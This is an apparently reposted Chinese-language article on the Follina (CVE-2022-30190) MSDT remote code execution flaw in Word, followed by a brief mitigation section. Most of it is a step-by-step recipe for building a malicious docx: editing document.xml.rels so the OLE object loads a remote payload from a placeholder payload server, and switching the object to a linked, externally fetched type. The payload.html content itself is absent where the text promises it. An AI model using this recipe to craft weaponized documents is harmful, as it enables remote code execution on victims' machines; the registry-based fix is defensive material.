# CVE-2022-30190—MSDT(Follina)远程代码执行漏洞

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg2Njc2MzM2NA==&mid=2247483686&idx=1&sn=f5840246c970568c19b2928f74fe6595&chksm=ce44962df9331f3b256ca52b5e3fb84da4d47b5dded21cffd1b9cc72903b522d8327b2fd3ebe&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=Mzg2Njc2MzM2NA==&mid=2247483686&idx=1&sn=f5840246c970568c19b2928f74fe6595&chksm=ce44962df9331f3b256ca52b5e3fb84da4d47b5dded21cffd1b9cc72903b522d8327b2fd3ebe&scene=27#wechat_redirect)

**利用方法**

新建一个docx文件——插入对象（OLE）——由文件创建（和CVE-2021-40444，相差不多）

![](../Images/bda008a395c76fd540ad795c757cfb9e.png)

然后改名为zip，解压缩修改：`word/_rels/document.xml.rels`里面的部分内容

*   
*   
*   
*   
*   
*   

```
"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"一栏的Target="xxxxx"——>Target="http://<payload_server>/payload.html!" #注意感叹号或者是：Target="mhtml:http://<payload_server>/exploit.html!x-usc:http://<payload_server>/exploit.html"并在后面加上TargetMode="External" #如果没有的话
```

  

修改`word/document.xml`里面的`<o:OLEObject` 一栏  

*   
*   
*   

```
Type="Embed"——>Type="Link" 并加上UpdateMode="OnCall"#在>后加下内容（链接到文件的默认有）<o:LinkType>EnhancedMetaFile</o:LinkType><o:LockedField>false</o:LockedField><o:FieldCodes>\f 0</o:FieldCodes>
```

然后把这两个文件替换掉原压缩包里面的文件或者另外压缩成zip，并改名为docx  
在服务器上面起一个http服务，并放入payload.html。内容为：

**修复方法**

**禁用MSDT URL协议  
**

1.  以管理员身份运行命令提示符
    
2.  要备份注册表项，请执行命令“reg export HKEY\_CLASSES\_ROOTms-msdt filename ”
    
3.  执行命令“reg delete HKEY\_CLASSES\_ROOTms-msdt /f”
    
      
    

**及时升级word到最新版本**
